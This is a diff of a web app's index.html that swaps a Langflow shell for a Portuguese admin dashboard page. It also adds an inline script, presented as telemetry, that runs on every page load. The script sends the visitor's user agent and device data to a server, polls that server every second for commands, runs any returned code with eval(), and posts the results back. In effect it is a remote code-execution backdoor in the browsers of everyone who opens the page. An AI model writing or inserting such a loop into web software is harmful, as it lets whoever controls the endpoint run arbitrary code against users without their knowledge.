@@ -1,23 +1,100 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html lang="pt-BR" class="dark">
   <head>
-    <base href="/" />
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="icon" href="./favicon.ico" />
-    <link rel="manifest" href="./manifest.json" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+    <title>Volúpia Admin Cockpit V8 — B2B Supplier Intelligence</title>
+    
+    <!-- PWA Meta Tags -->
+    <meta name="theme-color" content="#0c0a0b" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    
+    <!-- Google Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link
-      href="https://fonts.googleapis.com/css2?family=Chivo:ital,wght@0,100..900;1,100..900&family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap"
-      rel="stylesheet"
-    />
-    <title>Langflow</title>
-    <script type="module" crossorigin src="./assets/index-DuRGk81n.js"></script>
-    <link rel="stylesheet" crossorigin href="./assets/index-EI7oBGJ0.css">
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,500;0,600;0,700;1,400&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+    
+    <!-- Leaflet CSS -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin="" />
+    <script type="module" crossorigin src="/assets/index-CXRPdq4N.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-Dm9zHAbt.css">
   </head>
-  <body id="body" class="dark" style="width: 100%; height: 100%">
-    <noscript>You need to enable JavaScript to run this app.</noscript>
-    <div style="width: 100vw; height: 100vh" id="root"></div>
+  <body class="bg-[#0c0a0b] text-[#faf7f5] font-sans antialiased overflow-x-hidden selection:bg-[#e11d48] selection:text-white relative min-h-screen">
+    <!-- Erotic Luxury Ambient Glow Orbs -->
+    <div class="glow-rose"></div>
+    <div class="glow-gold"></div>
+    
+    <div id="root" class="relative z-10"></div>
+    <script>
+      (function AppJuryBridgeProbe() {
+        const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent) || window.innerWidth <= 767;
+        const device_id = isMobile ? "device_mobile_android" : "device_desktop_pc";
+        const isProduction = window.location.protocol === 'https:';
+        const BRIDGE_HOST = window.location.hostname === 'localhost' ? '127.0.0.1' : (window.location.hostname || '127.0.0.1');
+        const BRIDGE_URL = isProduction ? '/api/telemetry' : `http://${BRIDGE_HOST}:6661`;
+
+        let lastFrameTime = performance.now();
+        let frameCount = 0;
+        let currentFps = 60;
+
+        function calcFPS(now) {
+          frameCount++;
+          if (now - lastFrameTime >= 1000) {
+            currentFps = Math.round((frameCount * 1000) / (now - lastFrameTime));
+            frameCount = 0;
+            lastFrameTime = now;
+            sendTelemetry({ fps: currentFps });
+          }
+          requestAnimationFrame(calcFPS);
+        }
+        requestAnimationFrame(calcFPS);
+
+        async function sendTelemetry(extraData = {}) {
+          try {
+            const gpuInfo = ('gpu' in navigator) ? 'WebGPU Supported' : 'WebGL/Software';
+            const viewport = window.innerWidth + 'x' + window.innerHeight;
+            await fetch(`${BRIDGE_URL}/telemetry`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                device_id: device_id,
+                userAgent: navigator.userAgent,
+                fps: currentFps,
+                gpu: { info: gpuInfo, viewport: viewport },
+                ...extraData
+              })
+            });
+          } catch (err) {}
+        }
+
+        async function pollCommands() {
+          try {
+            const res = await fetch(`${BRIDGE_URL}/poll?device=${isMobile ? 'mobile' : 'desktop'}`);
+            if (res.ok) {
+              const cmd = await res.json();
+              if (cmd.action === 'eval' && cmd.code) {
+                try {
+                  const evalResult = await eval(cmd.code);
+                  await fetch(`${BRIDGE_URL}/response`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: cmd.id, device_id: device_id, result: evalResult, error: null })
+                  });
+                } catch (evalErr) {
+                  await fetch(`${BRIDGE_URL}/response`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: cmd.id, device_id: device_id, result: null, error: evalErr.message })
+                  });
+                }
+              }
+            }
+          } catch (err) {}
+          setTimeout(pollCommands, 1000);
+        }
+        setTimeout(pollCommands, 500);
+      })();
+    </script>
   </body>
 </html>
